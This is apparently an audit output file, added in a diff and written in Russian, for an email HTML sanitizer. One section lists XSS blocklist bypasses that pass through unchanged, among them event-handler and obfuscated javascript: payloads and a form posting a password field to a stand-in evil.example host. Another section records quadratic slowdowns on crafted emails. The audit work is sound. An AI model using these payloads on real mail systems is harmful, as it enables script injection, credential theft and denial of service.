@@ -1,0 +1,46 @@
+=== MAIL-08: обходы блок-листа (что остаётся в HTML после sanitizeEmailHtml) ===
+обработчик через слэш, без пробела     | вход: <img/onerror=alert(1) src=x>
+                                       | выход: <img/onerror=alert(1) src=x> (НЕ ИЗМЕНЕНО)
+svg onload через слэш                  | вход: <svg/onload=alert(1)>
+                                       | выход: <svg/onload=alert(1)> (НЕ ИЗМЕНЕНО)
+атрибуты впритык после кавычки         | вход: <img src="x"onerror="alert(1)">
+                                       | выход: <img src="x"onerror="alert(1)"> (НЕ ИЗМЕНЕНО)
+javascript: без кавычек                | вход: <a href=javascript:alert(1)>x</a>
+                                       | выход: <a href=javascript:alert(1)>x</a> (НЕ ИЗМЕНЕНО)
+javascript: с HTML-сущностью           | вход: <a href="java&#x73;cript:alert(1)">x</a>
+                                       | выход: <a href="java&#x73;cript:alert(1)">x</a> (НЕ ИЗМЕНЕНО)
+javascript: с табуляцией               | вход: <a href="jav&#9;ascript:alert(1)">x</a>
+                                       | выход: <a href="jav&#9;ascript:alert(1)">x</a> (НЕ ИЗМЕНЕНО)
+вложенный тег script                   | вход: <scr<script>ipt>alert(1)</scr</script>ipt>
+                                       | выход:  
+form с action                          | вход: <form action="https://evil.example/post" method="post"><input name=pw></form>
+                                       | выход: <form action="https://evil.example/post" method="post"><input name=pw></form> (НЕ ИЗМЕНЕНО)
+base href                              | вход: <base href="https://evil.example/">
+                                       | выход: <base href="https://evil.example/"> (НЕ ИЗМЕНЕНО)
+link stylesheet                        | вход: <link rel="stylesheet" href="https://evil.example/t.css">
+                                       | выход: <link rel="stylesheet" href="https://evil.example/t.css"> (НЕ ИЗМЕНЕНО)
+svg use внешний                        | вход: <svg><use href="https://evil.example/x.svg#a"/></svg>
+                                       | выход: <svg><use href="https://evil.example/x.svg#a"/></svg> (НЕ ИЗМЕНЕНО)
+math + xlink                           | вход: <math><a xlink:href="data:text/html,x">x</a></math>
+                                       | выход: <math><a xlink:href="#">x</a></math> 
+
+Проверка заявления 'Idempotent — safe to call multiple times' (HtmlUtils.kt:71):
+  после 1-го прохода: 
+  после 2-го прохода: 
+  идемпотентна: true
+
+=== MAIL-03: время sanitizeEmailHtml на 'ядовитом' письме ===
+<iframe>  x  10 000 (  80 000 байт):      3 308 мс
+<iframe>  x  20 000 ( 160 000 байт):     13 146 мс
+<iframe>  x  40 000 ( 320 000 байт):     52 568 мс
+<iframe>  x  80 000 ( 640 000 байт):    209 936 мс
+<script>  x  10 000 (  80 000 байт):      3 291 мс
+<script>  x  20 000 ( 160 000 байт):     13 349 мс
+<script>  x  40 000 ( 320 000 байт):     54 797 мс
+<script>  x  80 000 ( 640 000 байт):    211 365 мс
+<object>  x  10 000 (  80 000 байт):      3 292 мс
+<object>  x  20 000 ( 160 000 байт):     13 235 мс
+<object>  x  40 000 ( 320 000 байт):     52 988 мс
+<object>  x  80 000 ( 640 000 байт):    210 695 мс
+<applet>  x  10 000 (  80 000 байт):      3 296 мс
+<applet>  x  20 000 ( 160 000 байт):     13 209 мс
